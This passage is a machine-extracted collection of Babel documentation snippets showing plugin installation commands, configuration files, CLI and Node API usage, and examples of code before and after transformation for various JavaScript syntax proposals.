  equals(obj) {
    const x = this.#x,
      { y } = this;

    return (
      x === obj.#x && y === obj.y
    );
  }
}

----------------------------------------

TITLE: Installing @babel/plugin-transform-object-assign
DESCRIPTION: Command to install the Babel plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-object-assign

----------------------------------------

TITLE: Configuring Babel to Use Property Literals Transform Plugin
DESCRIPTION: This JSON configuration adds the @babel/plugin-transform-property-literals plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-property-literals"]
}

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage of the function name transform plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-function-name script.js

----------------------------------------

TITLE: Transforming Async Generator Function - Basic Example
DESCRIPTION: Demonstrates the basic transformation of an async generator function with await and yield statements.

LANGUAGE: javascript
CODE:
async function* agf() {
  await 1;
  yield 2;
}

LANGUAGE: javascript
CODE:
var _asyncGenerator = ...

let agf = (() => {
  var _ref = _asyncGenerator.wrap(function* () {
    yield _asyncGenerator.await(1);
    yield 2;
  });

  return function agf() {
    return _ref.apply(this, arguments);
  };
})();

----------------------------------------

TITLE: Installing @babel/plugin-syntax-object-rest-spread via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-object-rest-spread plugin using npm. This is a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-object-rest-spread

----------------------------------------

TITLE: Configuring in Babel Config
DESCRIPTION: JSON configuration to enable the plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-proposal-explicit-resource-management"]
}

----------------------------------------

TITLE: Using the bode-debug alias for babel-node-debug
DESCRIPTION: This command uses the bode-debug alias to run the babel-node-debug debugger on a specified script file. It provides a shorter alternative to the full babel-node-debug command.

LANGUAGE: sh
CODE:
bode-debug path/to/script.js

----------------------------------------

TITLE: Using Experimental Babel 8 Worker
DESCRIPTION: Example showing how to use the experimental Babel 8 implementation with async compilation support

LANGUAGE: javascript
CODE:
require("@babel/register/experimental-worker");

----------------------------------------

TITLE: Installing Babel Partial Application Syntax Plugin via NPM
DESCRIPTION: Command to install the @babel/plugin-syntax-partial-application package as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-partial-application

----------------------------------------

TITLE: Installing Babel Plugins for Constants and Block Scoping
DESCRIPTION: Commands to install Babel plugins for checking ES2015 constants and transforming block scoping using npm.

LANGUAGE: Shell
CODE:
$ npm install --save-dev babel-plugin-check-es2015-constants
$ npm install --save-dev babel-plugin-transform-es2015-block-scoping

----------------------------------------

TITLE: Installing @babel/plugin-proposal-import-defer via npm
DESCRIPTION: Shows the command to install the @babel/plugin-proposal-import-defer plugin using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-proposal-import-defer

----------------------------------------

TITLE: Using Babel Minify via Node API
DESCRIPTION: JavaScript code showing how to use the minify preset programmatically

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["minify"]
});

----------------------------------------

TITLE: Using @babel/plugin-transform-react-jsx-self via CLI
DESCRIPTION: Shell command to use the @babel/plugin-transform-react-jsx-self plugin with Babel CLI for transforming a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-react-jsx-self script.js

----------------------------------------

TITLE: Using Plugin via Babel CLI
DESCRIPTION: Command line usage of the top-level await syntax plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-top-level-await script.js

----------------------------------------

TITLE: Using Static Private Fields in Babel 7.1.0
DESCRIPTION: Support for static private fields, part of the static class features proposal.

LANGUAGE: JavaScript
CODE:
class Person {
  static #classId = 3;
}

----------------------------------------

TITLE: Class with Static and Instance Properties in JavaScript
DESCRIPTION: Example of a class with static and instance properties before transformation.

LANGUAGE: JavaScript
CODE:
class Foo {
  static bar;
  baz = 'guy';
}

----------------------------------------

TITLE: Applying @babel/preset-stage-1 using Babel Node API
DESCRIPTION: JavaScript code to use @babel/preset-stage-1 when transforming code with the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["@babel/preset-stage-1"]
});

----------------------------------------

TITLE: Updating TSMappedType Builder in Babel 8
DESCRIPTION: The signature of the t.tsMappedType builder has changed in Babel 8. It now takes separate arguments for key, constraint, nameType, and typeAnnotation.

LANGUAGE: typescript
CODE:
// To create { [P in string as Q]: number }

// Babel 7
t.tsMappedType(
  t.tsTypeParameter(t.tsStringKeyword(), undefined, "P"),
  t.tsNumberKeyword(),
  t.tsTypeReference(t.identifier("Q"))
)

// Babel 8
t.tsMappedType(
  t.identifier("P"),
  t.tsStringKeyword(),
  t.tsTypeReference(t.identifier("Q")),
  t.tsNumberKeyword()
)

----------------------------------------

TITLE: new.target Caveat with Super Calls
DESCRIPTION: Illustrates a potential issue when using new.target before super() in derived classes when classes aren't transformed to ES5.

LANGUAGE: javascript
CODE:
class Foo {}

class Bar extends Foo {
  constructor() {
    // This will be a problem if classes aren't transformed to ES5
    new.target;
    super();
  }
}

----------------------------------------

TITLE: Using Babel Plugin via CLI - Shell
DESCRIPTION: Command line usage of the Babel plugin to transform JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-exponentiation-operator script.js

----------------------------------------

TITLE: Transforming Unicode Regular Expressions with Babel Plugin
DESCRIPTION: This snippet demonstrates the transformation of a regular expression literal with the /u flag. The plugin converts the simple Unicode-aware regex into a more complex one that works in environments without native Unicode support.

LANGUAGE: JavaScript
CODE:
var string = "foo💩bar";
var match = string.match(/foo(.)bar/u);

LANGUAGE: JavaScript
CODE:
var string = "foo💩bar";
var match = string.match(
  /foo((?:[\0-\t\x0B\f\x0E-\u2027\u202A-\uD7FF\uE000-\uFFFF]|[\uD800-\uDBFF][\uDC00-\uDFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF]))bar/
);

----------------------------------------

TITLE: Installing @babel/plugin-syntax-numeric-separator via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-numeric-separator plugin using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-numeric-separator

----------------------------------------

TITLE: Installing @babel/plugin-proposal-optional-chaining-assign via npm
DESCRIPTION: Shows the command to install the Babel plugin using npm. This is a prerequisite for using the plugin in a project.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-proposal-optional-chaining-assign

----------------------------------------

TITLE: Implementing Babel JSON Strings Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the JSON strings syntax plugin with Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-json-strings"]
});

----------------------------------------

TITLE: Dynamic Import in SystemJS Modules
DESCRIPTION: Shows how the stage-2 'import()' syntax is now supported as a contextual import in the SystemJS modules transform.

LANGUAGE: JavaScript
CODE:
export function lazyLoadOperation () {
  return import('./x')
  .then(function (x) {
    x.y();
  });
}

----------------------------------------

TITLE: Preset Options Configuration
DESCRIPTION: Shows different ways to specify preset options in Babel configuration, from basic usage to detailed options objects.

LANGUAGE: json
CODE:
{
  "presets": [
    "presetA",
    ["presetA"],
    ["presetA", {}]
  ]
}

LANGUAGE: json
CODE:
{
  "presets": [
    [
      "@babel/preset-env",
      {
        "loose": true,
        "modules": false
      }
    ]
  ]
}

----------------------------------------

TITLE: Using object rest/spread syntax plugin via Babel CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-object-rest-spread plugin with Babel CLI. This enables parsing of object rest/spread syntax for the specified script.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-object-rest-spread script.js

----------------------------------------

TITLE: Installing and Configuring Babel Preset for All JavaScript Versions
DESCRIPTION: Commands to install the env preset for Babel, which includes all JavaScript versions, and the corresponding .babelrc configuration.

LANGUAGE: Shell
CODE:
$ npm install --save-dev babel-preset-env

LANGUAGE: JavaScript
CODE:
{
  "presets": ["env"]
}

----------------------------------------

TITLE: Applying babel-plugin-minify-guarded-expressions via Node API
DESCRIPTION: This JavaScript code shows how to use the plugin programmatically with Babel's Node API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-guarded-expressions"]
});

----------------------------------------

TITLE: Installing Throw Expressions Plugin via NPM
DESCRIPTION: Command to install the @babel/plugin-syntax-throw-expressions plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-throw-expressions

----------------------------------------

TITLE: Parsing Regular Expression Modifiers in Babel 7.26.0
DESCRIPTION: Enable parsing of the regular expression modifiers Stage 4 proposal by default.



----------------------------------------

TITLE: Complete Babelify Node.js Implementation
DESCRIPTION: Comprehensive example showing full Browserify and Babelify integration with error handling and file output

LANGUAGE: javascript
CODE:
var fs = require("fs");
var browserify = require("browserify");
var babelify = require("babelify");

browserify({ debug: true })
  .transform(babelify)
  .require("./script.js", { entry: true })
  .bundle()
  .on("error", function (err) { console.log("Error: " + err.message); })
  .pipe(fs.createWriteStream("bundle.js"));

----------------------------------------

TITLE: Configuring @babel/preset-stage-1 in babel.config.json
DESCRIPTION: JSON configuration to enable @babel/preset-stage-1 in a Babel project.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-stage-1"]
}

----------------------------------------

TITLE: Transforming Async Function to Bluebird Coroutine
DESCRIPTION: Example showing transformation with Bluebird coroutine option enabled.

LANGUAGE: javascript
CODE:
var Bluebird = require("bluebird");

var foo = Bluebird.coroutine(function*() {
  yield bar();
});

----------------------------------------

TITLE: Installing Babel Exponentiation Plugin - NPM/Yarn
DESCRIPTION: Command to install the Babel plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-exponentiation-operator

----------------------------------------

TITLE: Installing @babel/plugin-syntax-import-defer via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-import-defer plugin using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-import-defer

----------------------------------------

TITLE: Configuring Babel to use syntax-import-defer plugin
DESCRIPTION: JSON configuration for enabling the @babel/plugin-syntax-import-defer plugin in a Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-import-defer"]
}

----------------------------------------

TITLE: Installing babel-helper-is-void-0 Package
DESCRIPTION: Command to install babel-helper-is-void-0 as a development dependency using NPM or Yarn package managers.

LANGUAGE: shell
CODE:
npm install babel-helper-is-void-0 --save-dev

----------------------------------------

TITLE: ES2015 Class Minification Example
DESCRIPTION: Example showing how Babili handles ES2015 class syntax compared to traditional ES5 minification.

LANGUAGE: javascript
CODE:
class Mangler {
  constructor(program) {
    this.program = program;
  }
}
// need this since otherwise Mangler isn't used
new Mangler();

----------------------------------------

TITLE: Configuring Babel to use @babel/preset-stage-3
DESCRIPTION: JSON configuration for babel.config.json to include @babel/preset-stage-3 in the presets array.

LANGUAGE: JSON
CODE:
{
  "presets": ["@babel/preset-stage-3"]
}

----------------------------------------

TITLE: Using @babel/plugin-syntax-module-string-names via Node.js API
DESCRIPTION: This JavaScript snippet shows how to use the @babel/plugin-syntax-module-string-names plugin programmatically with Babel's Node.js API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-module-string-names"],
});

----------------------------------------

TITLE: Name Mangling Plugin Example
DESCRIPTION: Example showing how babel-plugin-minify-mangle-names performs context-aware variable renaming.

LANGUAGE: javascript
CODE:
var globalVariableName = 42;
function foo() {
  var longLocalVariableName = 1;
  if (longLocalVariableName) {
    console.log(longLocalVariableName);
  }
}

----------------------------------------

TITLE: Installing remove-console Babel Plugin
DESCRIPTION: Shows the command to install the babel-plugin-transform-remove-console package using npm or yarn.

LANGUAGE: Shell
CODE:
npm install babel-plugin-transform-remove-console --save-dev

----------------------------------------

TITLE: Node API Integration
DESCRIPTION: Example of using the type constructor minification plugin through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-type-constructors"]
});

----------------------------------------

TITLE: Installing React.MSBuild NuGet Package for ASP.NET 4.x Babel Support
DESCRIPTION: This command installs the React.MSBuild NuGet package, which provides the necessary MSBuild task for Babel support in ASP.NET 4.x projects. This package is part of the ReactJS.NET project and enables Babel integration.

LANGUAGE: powershell
CODE:
Install-Package React.MSBuild

----------------------------------------

TITLE: Babel CLI Usage
DESCRIPTION: Command line usage of the import reflection syntax plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-import-reflection script.js

----------------------------------------

TITLE: Using Smart Pipeline Operator in Babel 7.3.0
DESCRIPTION: Support for the smart pipeline operator proposal.

LANGUAGE: JavaScript
CODE:
num |> add(2, #) |> double

----------------------------------------

TITLE: Configuring Jasmine Helpers for Babel
DESCRIPTION: Configuration changes required in jasmine.json to enable Babel support via @babel/register. The helpers path is relative to spec_dir directory.

LANGUAGE: json
CODE:
{
  "helpers": [
    "../node_modules/@babel/register/lib/node.js"
  ]
}

----------------------------------------

TITLE: Configuring Babel for Optional Catch Binding in JSON
DESCRIPTION: JSON configuration for enabling the optional catch binding transform plugin in Babel.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-optional-catch-binding"]
}

----------------------------------------

TITLE: Configuring @babel/preset-react with environment-specific options in babel.config.js
DESCRIPTION: JavaScript configuration file (babel.config.js) demonstrating how to set development-specific options for @babel/preset-react based on the BABEL_ENV environment variable.

LANGUAGE: javascript
CODE:
module.exports = {
  presets: [
    [
      "@babel/preset-react",
      {
        development: process.env.BABEL_ENV === "development",
      },
    ],
  ],
};

----------------------------------------

TITLE: Configuring Babel to Use @babel/plugin-transform-dotall-regex
DESCRIPTION: This JSON configuration adds the @babel/plugin-transform-dotall-regex plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-dotall-regex"]
}

----------------------------------------

TITLE: Installing @babel/plugin-syntax-optional-chaining-assign via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-optional-chaining-assign Babel plugin using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-optional-chaining-assign

----------------------------------------

TITLE: Implementing Do Expressions Syntax Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the do expressions syntax plugin programmatically through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-do-expressions"]
});

----------------------------------------

TITLE: Installing Babel Plugin via NPM
DESCRIPTION: Command to install the babel-plugin-minify-numeric-literals package as a development dependency.

LANGUAGE: shell
CODE:
npm install babel-plugin-minify-numeric-literals --save-dev

----------------------------------------

TITLE: Using Async Generators Syntax Plugin via Babel CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-async-generators plugin with Babel CLI for transforming a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-syntax-async-generators script.js

----------------------------------------

TITLE: Node API Implementation
DESCRIPTION: Example of using the function name transform plugin programmatically via the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-function-name"],
});

----------------------------------------

TITLE: Node API Implementation
DESCRIPTION: Example of using the function name transform plugin programmatically via the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-function-name"],
});

----------------------------------------

TITLE: Webpack Configuration with Babel Polyfill
DESCRIPTION: Example webpack configuration showing how to include @babel/polyfill in the entry array.

LANGUAGE: javascript
CODE:
module.exports = {
  entry: ["@babel/polyfill", "./app/js"],
};

----------------------------------------

TITLE: Using Babel JSON Strings Plugin via CLI
DESCRIPTION: Command line usage of the JSON strings syntax plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-json-strings script.js

----------------------------------------

TITLE: Implementing Async Generator Functions
DESCRIPTION: Example of the new async generator function syntax support, which allows combining async/await with generator functions.

LANGUAGE: JavaScript
CODE:
async function* agf() {
  await 1;
  yield 2;
}

----------------------------------------

TITLE: Installing Babel Plugin via NPM
DESCRIPTION: Command to install the minify-flip-comparisons plugin as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install babel-plugin-minify-flip-comparisons --save-dev

----------------------------------------

TITLE: Using Inline RegExp Modifiers in Babel 7.21.0
DESCRIPTION: Support for the inline RegExp modifiers Stage 3 proposal.

LANGUAGE: JavaScript
CODE:
/(?i-m:a.)/m.exec("a\nAb"); // ["Ab"]

----------------------------------------

TITLE: Using Private Destructuring in Babel 7.17.0
DESCRIPTION: Parser support for the private destructuring Stage 2 proposal.

LANGUAGE: JavaScript
CODE:
class A {
  #x = 2;
  method() {
    const { #x: x } = this;
  }
}

----------------------------------------

TITLE: Initializing Babel Register with CommonJS
DESCRIPTION: Shows how to require @babel/register at the entry point of an application using CommonJS syntax. This enables Babel transformation for all subsequent file requires with .es6, .es, .jsx, and .js extensions.

LANGUAGE: javascript
CODE:
require("@babel/register");

----------------------------------------

TITLE: Using Property Literals Transform Plugin via Babel CLI
DESCRIPTION: This command demonstrates how to use the @babel/plugin-transform-property-literals plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-property-literals script.js

----------------------------------------

TITLE: Preset Ordering Configuration
DESCRIPTION: Illustrates preset ordering in Babel configuration, which runs in reverse order (last to first).

LANGUAGE: json
CODE:
{
  "presets": ["a", "b", "c"]
}

----------------------------------------

TITLE: Using Babel Plugin via CLI (Shell)
DESCRIPTION: Command to use the plugin with Babel CLI.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-private-property-in-object

----------------------------------------

TITLE: Transforming Unicode Escapes Example - JavaScript
DESCRIPTION: Demonstrates the transformation of ES2015 Unicode escapes to ES5 compatible format. Shows how a Unicode variable name and string content are transformed.

LANGUAGE: javascript
CODE:
var \u{1d49c} = "\u{Babe1}";

console.log(\u{1d49c});

LANGUAGE: javascript
CODE:
var _ud835_udc9c = "\uDAAA\uDFE1";

console.log(_ud835_udc9c);

----------------------------------------

TITLE: Using Private Brand Checks in Babel 7.15.0
DESCRIPTION: Enable the Private Brand Checks Stage 4 proposal by default.

LANGUAGE: JavaScript
CODE:
class A {
  static { initialize(A); } // static block
  #field;
  is(obj) {
    return #field in obj; // private brand check
  }
}

----------------------------------------

TITLE: Babel Plugin Installation Command
DESCRIPTION: NPM command to install the import attributes syntax plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-import-attributes

----------------------------------------

TITLE: Plugin Usage via CLI
DESCRIPTION: Command line usage example for applying the dead code elimination plugin

LANGUAGE: shell
CODE:
babel --plugins minify-dead-code-elimination script.js

----------------------------------------

TITLE: Specifying Plugin Options in Babel JSON
DESCRIPTION: Shows various ways to specify plugin options in Babel configuration, from no options to detailed option objects.

LANGUAGE: json
CODE:
{
  "plugins": ["pluginA", ["pluginA"], ["pluginA", {}]]
}

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "transform-async-to-module-method",
      {
        "module": "bluebird",
        "method": "coroutine"
      }
    ]
  ]
}

----------------------------------------

TITLE: Configuring @babel/plugin-syntax-import-meta in babel.config.json
DESCRIPTION: JSON configuration to enable the @babel/plugin-syntax-import-meta plugin in a Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-import-meta"]
}

----------------------------------------

TITLE: Static Path Evaluation for Object Expressions
DESCRIPTION: Support for evaluating static object expressions at compile time for optimization purposes

LANGUAGE: javascript
CODE:
// in
{['a' + 'b']: 10 * 20, 'z': [1, 2, 3]}
// out
{ab: 200, z: [1, 2, 3]}

----------------------------------------

TITLE: Installing @babel/plugin-transform-modules-umd via npm
DESCRIPTION: Command to install the @babel/plugin-transform-modules-umd plugin using npm package manager.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-modules-umd

----------------------------------------

TITLE: Array-Like Iteration Example
DESCRIPTION: Example showing how the arrayLikeIsIterable assumption affects DOM collection iteration.

LANGUAGE: javascript
CODE:
let images = $("img");

for (const img of images) {
  console.log(img);
}

const copy = [...images];

----------------------------------------

TITLE: Configuring Babel with @babel/plugin-syntax-export-default-from
DESCRIPTION: JSON configuration for babel.config.json file to include the @babel/plugin-syntax-export-default-from plugin.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-export-default-from"]
}

----------------------------------------

TITLE: Configuring Throw Expressions in Babel Config
DESCRIPTION: JSON configuration for enabling the throw expressions plugin in Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-proposal-throw-expressions"]
}

----------------------------------------

TITLE: Transformed Class Properties without Spec Option
DESCRIPTION: Shows the output of class property transformation without the 'spec' option enabled.

LANGUAGE: JavaScript
CODE:
var Foo = function Foo() {
  _classCallCheck(this, Foo);
  this.baz = 'guy';
};

----------------------------------------

TITLE: CLI Usage with Simple Options
DESCRIPTION: Example of using babel-minify CLI with simple boolean options to disable mangling.

LANGUAGE: shell
CODE:
minify input.js --mangle false

----------------------------------------

TITLE: Using Export Default From via CLI
DESCRIPTION: Command line usage of the plugin for transforming JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-proposal-export-default-from script.js

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Command line instruction for using the minify-flip-comparisons plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins minify-flip-comparisons script.js

----------------------------------------

TITLE: Installing @babel/runtime via npm or yarn
DESCRIPTION: Command to install @babel/runtime as a project dependency using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save @babel/runtime

----------------------------------------

TITLE: Using Property Mutators Plugin via CLI - Shell
DESCRIPTION: Command line usage example for the property mutators transform plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-property-mutators script.js

----------------------------------------

TITLE: Transforming Sticky Regex Syntax in JavaScript
DESCRIPTION: Example showing how the plugin transforms sticky regex syntax (/y flag) into an equivalent RegExp constructor call.

LANGUAGE: javascript
CODE:
const a = /o+/y;

LANGUAGE: javascript
CODE:
var a = new RegExp("o+", "y");

----------------------------------------

TITLE: Installing sails-hook-babel Development Dependency
DESCRIPTION: Command to install sails-hook-babel as a development dependency in a Node.js/Sails.js project using npm. This hook enables Babel transpilation support in Sails.js applications.

LANGUAGE: shell
CODE:
npm install --save-dev sails-hook-babel

----------------------------------------

TITLE: Installing babel-plugin-minify-infinity via npm
DESCRIPTION: This command installs the babel-plugin-minify-infinity plugin as a dev dependency using npm.

LANGUAGE: Shell
CODE:
npm install babel-plugin-minify-infinity --save-dev

----------------------------------------

TITLE: Transforming WebAssembly Import in JavaScript
DESCRIPTION: Demonstrates the input code that uses 'import source' for a WebAssembly module and how it's transformed for different target environments.

LANGUAGE: javascript
CODE:
import source libMod from "./lib.wasm";

LANGUAGE: javascript
CODE:
const libMod = await WebAssembly.compileStreaming(fetch(import.meta.resolve("./lib.wasm")));

LANGUAGE: javascript
CODE:
import { readFileSync as _readFileSync } from "fs";
const libMod = new WebAssembly.Module(_readFileSync(new URL(import.meta.resolve("./lib.wasm"))));

LANGUAGE: javascript
CODE:
"use strict";

const libMod = new WebAssembly.Module(require("fs").readFileSync(require.resolve("./lib.wasm")));

----------------------------------------

TITLE: Installing @babel/preset-stage-1 with npm or yarn
DESCRIPTION: Command to install the @babel/preset-stage-1 package as a dev dependency using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-stage-1

----------------------------------------

TITLE: Demonstrating Polyfill Requirements for Babel Features in JavaScript
DESCRIPTION: This code snippet shows a table of Babel features and their corresponding polyfill requirements. It highlights the need for specific polyfills to enable certain JavaScript functionalities when using Babel.

LANGUAGE: markdown
CODE:
| Feature                     | Requirements                           |
| --------------------------- | -------------------------------------- |
| Array destructuring, For Of | `Symbol`, `prototype[Symbol.iterator]` |
| Spread                      | `Array.from`                           |

----------------------------------------

TITLE: Babel CLI Usage
DESCRIPTION: Command line usage of the import attributes syntax plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-import-attributes script.js

----------------------------------------

TITLE: JSX Spread with Built-ins
DESCRIPTION: Using native Object.assign for JSX spread attributes when available

LANGUAGE: javascript
CODE:
// in
var div = <Component {...props} foo="bar" />
// out
var div = React.createElement(Component, Object.assign({}, props, { foo: "bar" }));

----------------------------------------

TITLE: Output Wrapped Function Example
DESCRIPTION: Shows how the function is transformed with a _wrapper function applied.

LANGUAGE: javascript
CODE:
_wrapper(function () {
})();

----------------------------------------

TITLE: Configuring Jest and Babel in package.json
DESCRIPTION: This code snippet shows how to set up Jest and Babel in the package.json file. It configures the test script to use Jest and sets up Babel as a transformer for JavaScript and TypeScript files.

LANGUAGE: json
CODE:
{
  "scripts": {
    "test": "jest"
  },
  "jest": {
    "transform": {
      "^.+\\.[t|j]sx?$": "babel-jest"
    }
  }
}

----------------------------------------

TITLE: Configuring JSON-Compatible Strings in Babel Generator
DESCRIPTION: Demonstrates how to enable the new 'jsonCompatibleStrings' option in Babel generator for JSON-compatible string output.

LANGUAGE: JavaScript
CODE:
{
  "generatorOpts": {
    "jsonCompatibleStrings": true // defaults to false
  }
}

----------------------------------------

TITLE: Using babel-minify CLI
DESCRIPTION: Example of using babel-minify's command-line interface to minify a JavaScript file while preserving class names.

LANGUAGE: shell
CODE:
minify input.js --out-file input.min.js --mangle.keepClassName

----------------------------------------

TITLE: Implementing External Helpers in Node.js
DESCRIPTION: JavaScript code showing how to use the external helpers plugin programmatically through the Babel Core API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-external-helpers"]
});

----------------------------------------

TITLE: Using @babel/plugin-syntax-flow via Babel CLI
DESCRIPTION: Command-line instruction to use the @babel/plugin-syntax-flow plugin when transpiling a JavaScript file with Babel.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-flow script.js

----------------------------------------

TITLE: Using @babel/plugin-transform-modules-amd via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-modules-amd plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-modules-amd script.js

----------------------------------------

TITLE: Flow Type Stripping Example
DESCRIPTION: Demonstrates how the preset strips Flow type annotations from JavaScript code.

LANGUAGE: javascript
CODE:
function foo(one: any, two: number, three?): string {}

LANGUAGE: javascript
CODE:
function foo(one, two, three) {}

----------------------------------------

TITLE: Installing @start/plugin-lib-babel Package
DESCRIPTION: This command installs the @start/plugin-lib-babel package as a development dependency. It can be used with npm or automatically converted to a yarn command.

LANGUAGE: shell
CODE:
npm install -D @start/plugin-lib-babel

----------------------------------------

TITLE: Installing Babel Plugin for WebAssembly Import in npm/yarn
DESCRIPTION: Shows the command to install the @babel/plugin-proposal-import-wasm-source plugin using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-proposal-import-wasm-source

----------------------------------------

TITLE: Configuring Babel Pipeline Operator Plugin
DESCRIPTION: JSON configuration for enabling the smart pipeline operator in Babel projects.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-pipeline-operator", { "proposal": "smart" }]
  ]
}

----------------------------------------

TITLE: Asserting Babel Version in Config Function
DESCRIPTION: Demonstration of using the assertVersion API to ensure a minimum Babel version for the configuration.

LANGUAGE: javascript
CODE:
module.exports = function(api) {\n  api.assertVersion("^7.2");\n  return {\n    // Configuration\n  };\n};

----------------------------------------

TITLE: Using Declaration Syntax Example in JavaScript
DESCRIPTION: Examples of using declarations syntax that this plugin enables Babel to parse, including both regular and await using statements.

LANGUAGE: javascript
CODE:
using handler = await read();
await using handler = await read();

----------------------------------------

TITLE: Using isNodesEquivalent in Babel Types
DESCRIPTION: Demonstrates the usage of the new 't.isNodesEquivalent' method for comparing AST nodes.

LANGUAGE: JavaScript
CODE:
assert(t.isNodesEquivalent(parse("1 + 1"), parse("1+1")) === true);

----------------------------------------

TITLE: Installing the Babel Plugin via npm
DESCRIPTION: This snippet shows the command to install the plugin using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-duplicate-named-capturing-groups-regex

----------------------------------------

TITLE: Using Babel Decorator Syntax Plugin via CLI
DESCRIPTION: Command line usage of the decorator syntax plugin with the Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-decorators script.js

----------------------------------------

TITLE: Using Export Default From via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-proposal-export-default-from"],
});

----------------------------------------

TITLE: Configuring @babel/plugin-proposal-function-sent in Babel
DESCRIPTION: JSON configuration to enable the @babel/plugin-proposal-function-sent plugin in a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-proposal-function-sent"]
}

----------------------------------------

TITLE: Transformed Class Properties with Spec Option
DESCRIPTION: Demonstrates the output of class property transformation with the 'spec' option enabled, using Object.defineProperty.

LANGUAGE: JavaScript
CODE:
var Foo = function Foo() {
  babelHelpers.classCallCheck(this, Foo);
  _initialiseProps.call(this);
};

Object.defineProperty(Foo, "bar", {
  enumerable: true,
  writable: true,
  value: undefined
});

var _initialiseProps = function () {
  Object.defineProperty(this, "bar", {
    enumerable: true,
    writable: true,
    value: foo
  });
};

----------------------------------------

TITLE: Installing @babel/standalone via CDN in HTML
DESCRIPTION: Demonstrates how to include @babel/standalone in an HTML file using a CDN link.

